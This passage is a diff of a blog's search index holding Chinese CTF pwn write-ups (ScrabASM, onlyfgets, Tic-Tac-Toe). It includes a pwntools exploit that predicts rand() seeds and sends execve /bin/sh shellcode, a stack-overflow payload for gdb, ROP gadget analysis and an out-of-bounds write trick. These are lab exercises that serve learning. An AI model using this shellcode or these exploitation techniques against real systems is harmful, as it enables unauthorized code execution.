class="line">        <span class="keyword">if</span> current_hand[pos] == target:</span><br><span class="line">            unfinished.remove(pos)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 从当前 rand_idx 开始找最早匹配</span></span><br><span class="line">        <span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(MAX_SWAP_TRIES):</span><br><span class="line">            idx = rand_idx + offset</span><br><span class="line">            <span class="keyword">if</span> idx &gt;= <span class="built_in">len</span>(future_rand):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> future_rand[idx] == target:</span><br><span class="line">                tries = offset + <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> tries &lt; best_tries:</span><br><span class="line">                    best_tries = tries</span><br><span class="line">                    best_pos = pos</span><br><span class="line">                <span class="keyword">break</span>  <span class="comment"># 找到最早的就停，不用再找更远的</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> best_pos <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;!!! 无法完成所有 tile，建议增大 MAX_SWAP_TRIES 或简化 TARGET&quot;</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 记录顺序和次数</span></span><br><span class="line">    execution_order.append((best_pos, best_tries))</span><br><span class="line">    swap_counts[best_pos] = best_tries</span><br><span class="line">    current_hand[best_pos] = TARGET[best_pos]</span><br><span class="line">    rand_idx += best_tries</span><br><span class="line">    unfinished.remove(best_pos)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nSwap 计划（贪心顺序）：&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> idx, (pos, times) <span class="keyword">in</span> <span class="built_in">enumerate</span>(execution_order, <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> times &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;idx:2d&#125;</span>. tile <span class="subst">&#123;pos:2d&#125;</span> → <span class="subst">&#123;times&#125;</span> 次&quot;</span>)</span><br><span class="line"></span><br><span class="line">total = <span class="built_in">sum</span>(swap_counts)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;总 swap 次数：<span class="subst">&#123;total&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ────────────────────────────────────────────────</span></span><br><span class="line"><span class="comment"># 自动化发送 swap 指令</span></span><br><span class="line"><span class="comment"># ────────────────────────────────────────────────</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">60</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;开始自动执行 swap 操作...&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;总 swap 次数：<span class="subst">&#123;<span class="built_in">sum</span>(swap_counts)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> pos, times <span class="keyword">in</span> execution_order:  <span class="comment"># 按贪心顺序</span></span><br><span class="line">    <span class="keyword">if</span> times &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;tile <span class="subst">&#123;pos:2d&#125;</span> 需要 swap <span class="subst">&#123;times&#125;</span> 次&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(times):</span><br><span class="line">        <span class="comment"># 每次都完整发一次 &quot;1&quot; + tile</span></span><br><span class="line">        p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&quot;(0-13): &quot;</span>, <span class="built_in">str</span>(pos).encode())</span><br><span class="line">        time.sleep(<span class="number">0.01</span> + random.uniform(<span class="number">0</span>, <span class="number">0.02</span>))<span class="comment"># 延迟调小一点，随机防检测</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;所有 swap 已发送完成！&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">gdb.attach(p)</span></span><br><span class="line"><span class="string">pause()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 发送 play</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n已发送 Play！现在应该进入 read(0) 阶段&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自动发送 execve /bin/sh shellcode</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">shellcode = (</span><br><span class="line">    <span class="string">b&quot;\x48\x31\xd2&quot;</span>             <span class="comment"># xor rdx, rdx</span></span><br><span class="line">    <span class="string">b&quot;\x52&quot;</span>                     <span class="comment"># push rdx</span></span><br><span class="line">    <span class="string">b&quot;\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68&quot;</span>  <span class="comment"># mov rax, &quot;/bin//sh&quot;</span></span><br><span class="line">    <span class="string">b&quot;\x50&quot;</span>                     <span class="comment"># push rax</span></span><br><span class="line">    <span class="string">b&quot;\x48\x89\xe7&quot;</span>             <span class="comment"># mov rdi, rsp</span></span><br><span class="line">    <span class="string">b&quot;\x52&quot;</span>                     <span class="comment"># push rdx</span></span><br><span class="line">    <span class="string">b&quot;\x57&quot;</span>                     <span class="comment"># push rdi</span></span><br><span class="line">    <span class="string">b&quot;\x48\x89\xe6&quot;</span>             <span class="comment"># mov rsi, rsp</span></span><br><span class="line">    <span class="string">b&quot;\x48\x31\xc0&quot;</span>             <span class="comment"># xor rax, rax</span></span><br><span class="line">    <span class="string">b&quot;\xb0\x3b&quot;</span>                 <span class="comment"># mov al, 0x3b</span></span><br><span class="line">    <span class="string">b&quot;\x0f\x05&quot;</span>                 <span class="comment"># syscall</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-]]></content>
-      <categories>
-        <category>Writeup</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>random-seed，shellcode</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CTF题解：onlyfgets</title>
-    <url>/2025/12/08/2025-12-08-onlyfgets/</url>
-    <content><![CDATA[<h1 id="onlyfgets"><a href="#onlyfgets" class="headerlink" title="onlyfgets"></a>onlyfgets</h1><h2 id="一、程序分析"><a href="#一、程序分析" class="headerlink" title="一、程序分析"></a>一、程序分析</h2><p><img src="/images/onlyfgets/checksec.png" alt="image-20251207102811670"></p>
-<p><img src="/images/onlyfgets/main.png" alt="image-20251207102832960"></p>
-<p><img src="/images/onlyfgets/222.png" alt="image-20251207102938104"></p>
-<p>程序只有NX保护，且有简单栈溢出。但是，查看程序没有system等可以直接获得shell的gadget</p>
-<p>有signal和alarm，根据提示gadget：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x00000000004010ae : add bl, dh ; endbr64 ; ret</span><br><span class="line">0x000000000040114c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>注：</p>
-<p><code>endbr64</code>（End Branch 64-bit）是 <strong>Intel CET</strong>（Control-flow Enforcement Technology）技术的一部分，用于防止ROP攻击。</p>
-<p>作用：endbr64  ; 标记这是一个合法的间接跳转目标</p>
-<p>工作原理：</p>
-<ol>
-<li>运行时检查：当程序通过间接跳转（如 <code>call rax</code>, <code>jmp [rbx]</code>）执行时</li>
-<li>如果目标地址不是 <code>endbr64</code> 指令 → 触发异常</li>
-<li>如果是 <code>endbr64</code> 指令→ 正常执行</li>
-</ol>
-</blockquote>
-<p>分析一下两个原语</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># add bl, dh ; ret</span></span><br><span class="line"><span class="comment">#能力：</span></span><br><span class="line"><span class="number">1.</span> 修改 RBX 的最低字节：BL = BL + DH</span><br><span class="line"><span class="number">2.</span> 不影响其他寄存器（除了 RBX）</span><br><span class="line"><span class="number">3.</span> 返回控制流</span><br><span class="line"></span><br><span class="line"><span class="comment"># 限制：</span></span><br><span class="line"><span class="number">1.</span> 只能加，不能减（除非溢出）</span><br><span class="line"><span class="number">2.</span> 只能修改最低字节</span><br><span class="line"><span class="number">3.</span> DH 的值是运行时决定的</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># add dword ptr [rbp - 0x3d], ebx ; nop ; ret</span></span><br><span class="line"><span class="comment">#能力：</span></span><br><span class="line"><span class="number">1.</span> 内存加法：*(rbp-<span class="number">0x3d</span>) += ebx</span><br><span class="line"><span class="number">2.</span> 操作<span class="number">32</span>位数据（dword）</span><br><span class="line"><span class="number">3.</span> 返回控制流</span><br><span class="line"></span><br><span class="line"><span class="comment">#限制：</span></span><br><span class="line"><span class="number">1.</span> 只能加，不能减</span><br><span class="line"><span class="number">2.</span> 只能操作 [rbp-<span class="number">0x3d</span>] 这个固定偏移</span><br><span class="line"><span class="number">3.</span> 操作<span class="number">4</span>字节，可能影响指针的高位</span><br></pre></td></tr></table></figure>
-
-<p><strong>假设我们可以控制 rbp 和 ebx，就可以向任意地址 (rbp - 0x3d) 加任意值 (ebx)</strong></p>
-<h2 id="二、调试过程"><a href="#二、调试过程" class="headerlink" title="二、调试过程"></a>二、调试过程</h2><h3 id="（一）-原语利用"><a href="#（一）-原语利用" class="headerlink" title="（一） 原语利用"></a>（一） 原语利用</h3><h4 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h4><p>根据上述分析，我们尝试控制 rbp 和 ebx，查一下 pop 指令：</p>
-<p><img src="/images/onlyfgets/step1.png" alt="image-20251208144151439"></p>
-<p>可以看到，我们有了gadget</p>
-<ul>
-<li>0x000000000040114d : pop rbp ; ret</li>
-<li>0x00000000004011fc : pop rdi ; ret</li>
-</ul>
-<p>但是无法直接控制 ebx。思考，ebx 可以通过 bl + dh 修改，通过调试命令查看一下dh</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xae\x10\x40\x00\x00\x00\x00\x00&quot;</span> | gdb ./onlyfgets -ex <span class="string">&quot;b *0x4010ae&quot;</span> -ex <span class="string">&quot;r&quot;</span> -ex <span class="string">&quot;print (\$rdx &gt;&gt; 8) &amp; 0xFF&quot;</span> -ex <span class="string">&quot;c&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>注：</p>
-<ol>
-<li><p>输入</p>
-<ul>
-<li><p><code>-e</code>：启用转义字符解释</p>
-</li>
-<li><p><code>AAAAAAAA...</code>：40个 ‘A’（32缓存，8 rbp）</p>
-</li>
-<li><p><code>\xae\x10\x40\x00\x00\x00\x00\x00</code>：小端序的 0x4010ae（<code>add bl, dh</code> gadget）</p>
-</li>
-</ul>
-</li>
-<li><p>断点：</p>
-<ul>
-<li><p><code>-ex</code>：执行gdb命令</p>
-</li>
-<li><p><code>b *地址</code>：在指定地址设置断点</p>
-</li>
-<li><p><code>0x4010ae</code>：<code>add bl, dh</code> gadget 的地址</p>
-</li>
-</ul>
-</li>
-<li><p>计算</p>
-<ul>
-<li><p><code>-ex &quot;r&quot; </code> ：运行程序</p>
-</li>
-<li><p><code>\$rdx</code>：RDX 寄存器（需要转义 <code>$</code>）</p>
-</li>
-<li><p><code>&gt;&gt; 8</code>：右移8位（获取高8位）</p>
-</li>
-<li><p><code>&amp; 0xFF</code>：取低8位</p>
-</li>
-</ul>
-</li>
-</ol>
-</blockquote>
-<p>运行结果：</p>
-<p><img src="/images/onlyfgets/step11.png" alt="image-20251208150004782"></p>
-<p>可以看到计算出 $1 (即dh) &#x3D; 32 (0x20)。或者直接看下面RDX显示的0xfbad208b</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">0x00000000fbad208b</span><br><span class="line">          ↑↑</span><br><span class="line">高位字节   低位字节</span><br><span class="line"></span><br><span class="line">RDX（64位）：0x00000000fbad208b</span><br><span class="line">EDX（32位）：0xfbad208b  </span><br><span class="line">DX（16位）：0x208b</span><br><span class="line">DH（高8位）：0x20</span><br><span class="line">DL（低8位）：0x8b</span><br></pre></td></tr></table></figure>
-
-
-
-<blockquote>
-<p>(注：</p>
-<p><strong>这是 <code>_IO_FILE</code> 结构的标志位。<code>0xfbad</code> 是 glibc 的魔法数字，标识这是一个 <code>_IO_FILE</code> 结构；而标志位 <code>0x208b</code>，</strong></p>
-<ul>
-<li><p>0x2000 &#x3D; _IO_USER_BUF    (0x2000) - 用户提供的缓冲区</p>
-</li>
-<li><p>0x0080 &#x3D; _IO_CURRENTLY_PUTTING (0x0080) - 当前正在写入</p>
-</li>
-<li><p>0x0008 &#x3D; _IO_NO_READS    (0x0008) - 不允许读取</p>
-</li>
-<li><p>0x0002 &#x3D; _IO_LINE_BUF    (0x0002) - 行缓冲</p>
-</li>
-<li><p>0x0001 &#x3D; _IO_UNBUFFERED  (0x0001) - 无缓冲)</p>
-</li>
-</ul>
-<p><strong>所以，DH 值是固定的：来自 stdin 的 flags 字段，每次都是 0x20，无法改变，除非能修改内存中的 stdin 结构本身</strong></p>
-</blockquote>
-<h4 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h4><p>现在我们确认了，每次 add bl, dh 会给 bl 加 0x20，所以需要加上0x20的倍数，加法后的地址必须是<strong>另一个有用函数</strong>的地址</p>
-]]></content>
-      <categories>
-        <category>Writeup</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-        <tag>ctf</tag>
-        <tag>stack-overflow</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CTF题解：Tic-Tac-Toe</title>
-    <url>/2026/02/09/2026-02-09-Tic-Tac-Toe/</url>
-    <content><![CDATA[<h1 id="Tic-Tac-Toe"><a href="#Tic-Tac-Toe" class="headerlink" title="Tic-Tac-Toe"></a>Tic-Tac-Toe</h1><h2 id="一、题目分析"><a href="#一、题目分析" class="headerlink" title="一、题目分析"></a>一、题目分析</h2><p>分析源码，winner &#x3D; checkWin()，只要player &#x3D;&#x3D; winner即可获得flag。当然，这里目标不是简单的下棋赢，因为玩家在这个程序里下井字棋要么输要么平局，我们需要找到另一种方式让winner &#x3D;&#x3D; player</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (winner == player) &#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;How&#x27;s this possible? Well, I guess I&#x27;ll have to give you the flag now.\n&quot;</span>);</span><br><span class="line">   FILE* flag = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">   <span class="type">char</span> buf[<span class="number">256</span>];</span><br><span class="line">   fgets(buf, <span class="number">256</span>, flag);</span><br><span class="line">   buf[<span class="built_in">strcspn</span>(buf, <span class="string">&quot;\n&quot;</span>)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">   <span class="built_in">puts</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Nice try, but I&#x27;m still unbeatable.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>首先查看一下程序如何判定winner。很明显，checkWin函数会返回 O 或 X，根据程序开头的定义：char player &#x3D; ‘X’;char computer &#x3D; ‘O’;，期望的返回值应该是X。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">checkWin</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (board[<span class="number">3</span>*i] == board[<span class="number">3</span>*i+<span class="number">1</span>] &amp;&amp; board[<span class="number">3</span>*i] == board[<span class="number">3</span>*i+<span class="number">2</span>] &amp;&amp; board[<span class="number">3</span>*i] != <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">         <span class="keyword">return</span> board[<span class="number">3</span>*i];</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (board[i] == board[<span class="number">3</span>+i] &amp;&amp; board[i] == board[<span class="number">6</span>+i] &amp;&amp; board[i] != <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">         <span class="keyword">return</span> board[i];</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> (board[<span class="number">0</span>] == board[<span class="number">4</span>] &amp;&amp; board[<span class="number">0</span>] == board[<span class="number">8</span>] &amp;&amp; board[<span class="number">0</span>] != <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">      <span class="keyword">return</span> board[<span class="number">0</span>];</span><br><span class="line">   <span class="keyword">if</span> (board[<span class="number">2</span>] == board[<span class="number">4</span>] &amp;&amp; board[<span class="number">2</span>] == board[<span class="number">6</span>] &amp;&amp; board[<span class="number">2</span>] != <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">      <span class="keyword">return</span> board[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>再看playerMove函数，index检查不严密，并且 board[index] &#x3D; player 会将player覆写对应索引的内存，于是想到能否通过计算获得一个index指向 char computer &#x3D; ‘O’，然后board[index] &#x3D; player将此处内存覆盖为 X，这样棋盘上将不会出现 O，checkWin函数的返回值永远是 X，winner &#x3D;&#x3D; player</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">playerMove</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="type">int</span> x, y;</span><br><span class="line">   <span class="keyword">do</span>&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Enter row #(1-3): &quot;</span>);</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Enter column #(1-3): &quot;</span>);</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;y);</span><br><span class="line">      <span class="type">int</span> index = (x<span class="number">-1</span>)*<span class="number">3</span>+(y<span class="number">-1</span>);</span><br><span class="line">      <span class="keyword">if</span>(index &gt;= <span class="number">0</span> &amp;&amp; index &lt; <span class="number">9</span> &amp;&amp; board[index] != <span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;Invalid move.\n&quot;</span>);</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">         board[index] = player; <span class="comment">// Should be safe, given that the user cannot overwrite tiles on the board</span></span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;<span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="二、漏洞"><a href="#二、漏洞" class="headerlink" title="二、漏洞"></a>二、漏洞</h2><p>接下来需要确定player和computer的内存布局，使用gdb调试。</p>
-<p><img src="/images/26-02-09-Tic-Tac-Toe/%E5%86%85%E5%AD%98.png" alt="image-20260209152301225"></p>
-<p>可以看到，在 -23 的位置就是 computer 的内存，playerMove函数里有 int index &#x3D; (x-1)*3+(y-1);，计算一下(x-1)3+(y-1)&#x3D;-23，可以让 x&#x3D;0 、y&#x3D;-19，输入即可将 computer 的内存改成X</p>
-<p><img src="/images/26-02-09-Tic-Tac-Toe/%E5%86%85%E5%AD%982.png" alt="image-20260209152908305"></p>
-<p>之后棋盘上就不会出现 O，随便下棋让 X 连成 3 个就可以赢，获得flag。</p>
-]]></content>
-      <categories>
-        <category>Writeup</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>学习笔记：SROP技术</title>
     <url>/2026/02/05/2026-02-05-SROP%E6%8A%80%E6%9C%AF/</url>
     <content><![CDATA[<h1 id="SROP技术"><a href="#SROP技术" class="headerlink" title="SROP技术"></a>SROP技术</h1><h2 id="一、调试"><a href="#一、调试" class="headerlink" title="一、调试"></a>一、调试</h2><p>在学习SROP攻击之前，我们需要了解一下当 <em>向程序发出信号</em> 且 <em>程序有相应的信号处理程序</em> 时会发生什么</p>
@@ -1036,22 +859,181 @@
       </tags>
   </entry>
   <entry>
-    <title>Hello World</title>
-    <url>/2025/12/04/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+    <title>CTF题解：ScrabASM</title>
+    <url>/2026/02/09/2026-02-09-ScrabASM/</url>
+    <content><![CDATA[<h1 id="ScrabASM"><a href="#ScrabASM" class="headerlink" title="ScrabASM"></a>ScrabASM</h1><h2 id="一、题目分析"><a href="#一、题目分析" class="headerlink" title="一、题目分析"></a>一、题目分析</h2><p>查看程序，发现程序分配了一块固定地址 0x13370000 的可读可写可执行区域，还会执行这里的机器码。第一反应是构造 14 字节的 shellcode，但调试看了一下执行0x13370000时的寄存器状态根本无法构造出一个 14 字节的 shellcode，这是第一个难点。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> HAND_SIZE 14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOARD_ADDR 0x13370000UL</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">play</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *hand)</span> &#123;</span><br><span class="line">    <span class="type">void</span> *board = mmap((<span class="type">void</span> *)BOARD_ADDR, BOARD_SIZE,</span><br><span class="line">                       PROT_READ | PROT_WRITE | PROT_EXEC,</span><br><span class="line">                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (board == MAP_FAILED) &#123;</span><br><span class="line">        perror(<span class="string">&quot;    mmap&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;    Playing your word...&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;    TRIPLE WORD SCORE!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(board, hand, HAND_SIZE);</span><br><span class="line">    ((<span class="type">void</span> (*)(<span class="type">void</span>))board)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<p>再看源码，发现程序会调用 rand() 来控制 0x13370000 区域的机器码，虽然可以通过swap再次通过 rand() 生成一个字节，但程序只会输出一次字节序列，就是我们无法知道swap的字节是什么，这是第二个难点。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">swap_tile</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *hand)</span> &#123;</span><br><span class="line">    <span class="type">char</span> line[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    Which tile? (0-%d): &quot;</span>, HAND_SIZE - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!fgets(line, <span class="keyword">sizeof</span>(line), <span class="built_in">stdin</span>)) <span class="keyword">return</span>;</span><br><span class="line">    <span class="type">int</span> idx = atoi(line);</span><br><span class="line">    <span class="keyword">if</span> (idx &lt; <span class="number">0</span> || idx &gt;= HAND_SIZE) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;    Invalid tile!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    hand[idx] = rand() &amp; <span class="number">0xFF</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;    Tile swapped!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<p>看到rand()后，又出现一个想法，就是rand()生成的是伪随机数，由种子决定，能否通过覆盖种子来控制伪随机数生成？但是看遍了源码都没有找到任何有机会溢出的漏洞点。</p>
+<h2 id="二、漏洞"><a href="#二、漏洞" class="headerlink" title="二、漏洞"></a>二、漏洞</h2><p>隔了一天再看这道题，既然rand()依靠种子生成伪随机数，而种子通过当前的时间戳生成，srand(time(NULL))以秒为单位，所有只要在同一秒的时间去使用 srand(time(NULL))，生成的种子就相同，说明我们可以利用这一点在本地生成rand()伪随机数，以此推算出程序生成的伪随机数，甚至推算出需要swap多少次可以生成需要的数字。</p>
+<p>让ai写个脚本验证一下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">BINARY = <span class="string">&quot;./scrabASM&quot;</span></span><br><span class="line">libc = ctypes.CDLL(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">libc.srand.argtypes = [ctypes.c_uint]</span><br><span class="line">libc.rand.restype = ctypes.c_int</span><br><span class="line"></span><br><span class="line">p = process(BINARY)</span><br><span class="line"><span class="comment">#p = remote(&#x27;chall.lac.tf&#x27;, 31338)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your starting tiles:\n&quot;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">line = p.recvline().decode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取 14 个 hex</span></span><br><span class="line">hexes = re.findall(<span class="string">r&#x27;([0-9a-fA-F]&#123;2&#125;)&#x27;</span>, line)</span><br><span class="line">real = [<span class="built_in">int</span>(x,<span class="number">16</span>) <span class="keyword">for</span> x <span class="keyword">in</span> hexes[:<span class="number">14</span>]]</span><br><span class="line"></span><br><span class="line">seed = <span class="built_in">int</span>(time.time()) <span class="comment"># - 1</span></span><br><span class="line">libc.srand(seed)</span><br><span class="line">pred = [libc.rand() &amp; <span class="number">0xFF</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>)]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;真实:&quot;</span>, <span class="string">&#x27; &#x27;</span>.join(<span class="string">f&quot;<span class="subst">&#123;x:02x&#125;</span>&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> real))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;预测:&quot;</span>, <span class="string">&#x27; &#x27;</span>.join(<span class="string">f&quot;<span class="subst">&#123;x:02x&#125;</span>&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> pred))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;匹配?&quot;</span>, real == pred)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
